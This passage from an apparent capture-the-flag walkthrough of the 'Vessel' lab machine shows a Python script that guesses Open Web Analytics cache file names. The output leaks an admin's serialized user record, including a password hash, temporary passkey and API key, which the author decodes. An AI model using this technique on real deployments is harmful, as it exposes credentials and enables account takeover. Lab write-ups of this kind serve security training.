<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>user_id <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> (user_id <span class="op">&lt;</span> <span class="dv">10</span>):</span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>    unhashed_key <span class="op">=</span> <span class="st">"user_id"</span> <span class="op">+</span> <span class="bu">str</span>(user_id)</span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>    cache_filename <span class="op">=</span> md5(unhashed_key.encode()).hexdigest() <span class="op">+</span> <span class="st">".php"</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>    url <span class="op">=</span> <span class="st">"http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/"</span> <span class="op">+</span> cache_filename</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(user_id, <span class="st">"="</span>, url)</span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> requests.session().get(url)</span>
<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> r.status_code <span class="op">!=</span> <span class="dv">404</span>:</span>
<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(r.content)</span>
<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span></span>
<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a>    user_id <span class="op">=</span> user_id <span class="op">+</span> <span class="dv">1</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Running the script returns:</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ./get-cache-file.py </span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/ee140b966fcc6e58868032d658ae518e.php</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">3</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/333a7b2c4fe7e6a9e1028a51df3816d3.php</span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">4</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/761b16cfc8c4c438b5cd6974f3313b91.php</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">5</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/277eabec41d80d89bc280c5b88ca18a8.php</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">6</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/f00dc1ccf8f0214684cd1b3722648bfd.php</span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ex">7</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/8c43aebbdb615fce9c93df72bb956116.php</span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="ex">8</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/39e2305c9e511e28167c2b8644daf256.php</span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="ex">9</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/40f0efb1108be4366e279bb71efbed16.php</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>However, as mentioned earlier, if we do a invalid login as user <strong>admin</strong> and run the script again, we’ll get the secret base64 data.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ./get-cache-file.py</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span> = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">b</span><span class="st">'&lt;?php\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJG0wTDdwbVhiS054dlJWcUpIR1dKWS40a3ZxM0hsaEhjYlZoakFxRGt6b1pjVnUvc3c0UENXIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjYzI1YzYzOWY0Mzk1MTA5ZTAzODE3ODRiN2VjODQwZSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\n?&gt;'</span></span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel echo <span class="st">"Tzo [... snip ...] Tjt9"</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="ex">O:8:</span><span class="st">"owa_user"</span><span class="ex">:5:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"base.user"</span><span class="kw">;</span><span class="ex">s:10:</span><span class="st">"properties"</span><span class="kw">;</span><span class="ex">a:10:{s:2:</span><span class="st">"id"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:1:</span><span class="st">"1"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:6:</span><span class="st">"SERIAL"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:7:</span><span class="st">"user_id"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"admin"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:1</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:8:</span><span class="st">"password"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:60:</span><span class="st">"</span><span class="va">$2</span><span class="st">y</span><span class="va">$1</span><span class="st">0</span><span class="va">$m0L7pmXbKNxvRVqJHGWJY</span><span class="st">.4kvq3HlhHcbVhjAqDkzoZcVu/sw4PCW"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:4:</span><span class="st">"role"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"admin"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:9:</span><span class="st">"real_name"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default admin"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:13:</span><span class="st">"email_address"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:16:</span><span class="st">"admin@vessel.htb"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:12:</span><span class="st">"temp_passkey"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:32:</span><span class="st">"cc25c639f4395109e0381784b7ec840e"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:13:</span><span class="st">"creation_date"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:10:</span><span class="st">"1650211659"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:6:</span><span class="st">"BIGINT"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:16:</span><span class="st">"last_update_date"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:10:</span><span class="st">"1650211659"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:6:</span><span class="st">"BIGINT"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:7:</span><span class="st">"api_key"</span><span class="kw">;</span><span class="ex">O:12:</span><span class="st">"owa_dbColumn"</span><span class="ex">:11:{s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">s:7:</span><span class="st">"api_key"</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"value"</span><span class="kw">;</span><span class="ex">s:32:</span><span class="st">"a390cc0247ecada9a2b8d2338b9ca6d2"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"data_type"</span><span class="kw">;</span><span class="ex">s:12:</span><span class="st">"VARCHAR(255)"</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"foreign_key"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"is_primary_key"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:14:</span><span class="st">"auto_increment"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"is_unique"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:11:</span><span class="st">"is_not_null"</span><span class="kw">;</span><span class="ex">b:0</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"label"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"index"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="ex">s:13:</span><span class="st">"default_value"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}}</span><span class="ex">s:16:</span><span class="st">"_tableProperties"</span><span class="kw">;</span><span class="ex">a:4:{s:5:</span><span class="st">"alias"</span><span class="kw">;</span><span class="ex">s:4:</span><span class="st">"user"</span><span class="kw">;</span><span class="ex">s:4:</span><span class="st">"name"</span><span class="kw">;</span><span class="ex">s:8:</span><span class="st">"owa_user"</span><span class="kw">;</span><span class="ex">s:9:</span><span class="st">"cacheable"</span><span class="kw">;</span><span class="ex">b:1</span><span class="kw">;</span><span class="ex">s:23:</span><span class="st">"cache_expiration_period"</span><span class="kw">;</span><span class="ex">i:604800</span><span class="kw">;</span><span class="er">}</span><span class="ex">s:12:</span><span class="st">"wasPersisted"</span><span class="kw">;</span><span class="ex">b:1</span><span class="kw">;</span><span class="ex">s:5:</span><span class="st">"cache"</span><span class="kw">;</span><span class="ex">N</span><span class="kw">;</span><span class="er">}</span><span class="ex">%</span> </span></code><button title="Copy to Clipboard" 